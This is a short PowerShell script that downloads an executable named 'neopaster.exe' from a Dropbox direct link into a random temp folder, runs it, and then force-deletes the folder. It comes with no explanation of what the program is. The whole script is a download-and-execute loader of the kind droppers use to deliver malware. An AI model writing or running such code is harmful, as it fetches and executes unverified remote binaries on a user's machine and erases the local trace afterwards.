$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"  
$tempdir = "$env:TEMP\$(New-Guid)" 
mkdir $tempdir | Out-Null
$file = "$tempdir\app.exe" 

try {
    irm -Uri $url -OutFile $file -ErrorAction Stop 
    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)"  
} catch {
    Write-Error "An error occurred: $_"  
} finally {
    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  
}
